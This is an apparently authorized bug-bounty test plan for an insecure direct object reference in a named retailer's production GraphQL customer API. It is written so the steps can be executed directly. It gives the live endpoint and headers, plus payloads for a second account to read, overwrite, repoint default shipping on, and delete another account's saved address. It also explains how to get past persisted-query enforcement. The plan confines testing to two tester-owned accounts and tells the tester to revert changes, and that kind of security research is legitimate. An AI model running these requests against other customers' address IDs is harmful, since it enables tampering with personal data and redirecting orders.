# C1 — Address-book IDOR — execute-ready

**Status:** strongest candidate. Object IDs **confirmed sequential** — live capture shows `AddAddress` → id `21388951835` (11-digit integer). Enumerable. Only the ownership check remains to be proven.

**What's needed to confirm:** two accounts you control — **A** (attacker) and **B** (victim), both `@wearehackerone.com` aliases. No orders, no purchase, no real customer data. Reversible in seconds.

Endpoint: `POST https://www.abercrombie.com/api/bff/customer?brand=anf&catalogId=10901&country=US&langId=-1&store=a-wd&storeId=11203`
Headers: session cookie for the acting account; `x-operation-name: <OperationName>`; `Content-Type: application/json`; UA marker `h1-<yourhandle>` per policy.

---

### Step 1 — as B, plant an address and read its id
```json
{"operationName":"AddAddress","variables":{"address":{"country":"US","firstName":"Victim","lastName":"Btest","address1":"1 Victim Way","city":"Columbus","state":"OH","postalCode":"43004"}},"query":"mutation AddAddress($address: AddressInput!){addAddress(address:$address){success __typename}}"}
```
Then read it back (get `idB`):
```json
{"operationName":"GetAddressPageData","variables":{},"query":"query GetAddressPageData{savedAddresses:getAllAddresses{defaultId addresses{id address1 city state postalCode isDefaultShipping __typename}} __typename}"}
```

### Step 2 — as A (different session cookie), attack idB
Run these one at a time. **Any success = confirmed IDOR.**

Read (BOLA read):
```json
{"operationName":"GetAddress","variables":{"id":"<idB>"},"query":"query GetAddress($id: ID!){getAddress(id:$id){id address1 city postalCode __typename}}"}
```
Repoint victim's default shipping (highest impact):
```json
{"operationName":"SetDefaultAddress","variables":{"id":"<idB>"},"query":"mutation SetDefaultAddress($id: ID!){setDefaultAddress(id:$id){success __typename}}"}
```
Overwrite victim's address:
```json
{"operationName":"UpdateAddress","variables":{"id":"<idB>","address":{"address1":"ATTACKER-CONTROLLED","city":"Columbus","state":"OH","postalCode":"43004","country":"US","firstName":"Victim","lastName":"Btest"}},"query":"mutation UpdateAddress($id: ID!,$address: AddressInput!){updateAddress(id:$id,address:$address){success __typename}}"}
```
Delete victim's address:
```json
{"operationName":"RemoveAddress","variables":{"id":"<idB>"},"query":"mutation RemoveAddress($id: ID!){removeAddress(id:$id){success __typename}}"}
```

### Step 3 — prove it
As B, re-run `GetAddressPageData`. If A's action changed/removed B's address (or A's `GetAddress` returned B's data), the ownership check is missing → **confirmed IDOR**, severity High→Critical (default-shipping repoint = order/PII redirect). Screenshot both sessions side by side (different account emails visible). Revert immediately.

**Note the exact query text above is reconstructed from the bundle's fragments** — if the server enforces persisted queries strictly it may reject a raw `query` string and require the registered `sha256Hash`. If so, capture each op's hash from your own logged-in session (DevTools → Network → the `/api/bff/customer` calls) and replay with `extensions.persistedQuery.sha256Hash` instead of the inline query. The `variables` (the `id`) are what matter for the IDOR either way.
```
```
